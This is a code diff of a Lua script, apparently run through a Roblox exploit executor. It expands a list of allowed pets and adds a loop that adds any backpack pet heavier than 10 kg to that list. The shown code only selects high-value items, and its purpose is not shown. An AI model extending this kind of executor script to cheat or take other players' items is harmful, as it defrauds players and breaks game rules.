@@ -141,22 +141,29 @@ local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
 local allowedPets = {
     ["Raccoon"] = true,
+    ["Disco Bee"] = true,
+    ["Bear Bee"] = true,
+    ["Scarlet Macaw"] = true,
+    ["Petal Bee"] = true,
+    ["Mimic Octopus"] = true,
     ["Queen Bee"] = true,
     ["Dragonfly"] = true,
     ["Red Fox"] = true,
-    ["Night Owl"] = true,
-    ["Owl"] = true,
-    ["Blood Owl"] = true,
-    ["Praying Mantis"] = true,
-    ["Chicken Zombie"] = true,
     ["Polar Bear"] = true,
-    ["Petal Bee"] = true,
-    ["Bear Bee"] = true,
-    ["Disco Bee"] = true,
     ["Butterfly"] = true,
-    ["Mimic Octopus"] = true,
-    ["Scarlet Macaw"] = true,
+    ["Chicken Zombie"] = true,
+    ["Cooked Owl"] = true,
 }
+
+-- Dynamically add pets >10Kg to allowedPets during script execution
+for _, item in pairs(backpack:GetChildren()) do
+    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+    local kg = tonumber(string.match(item.Name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
+
+    if kg > 10 then
+        allowedPets[baseName] = true
+    end
+end
 
 
 local petCountMap = {}
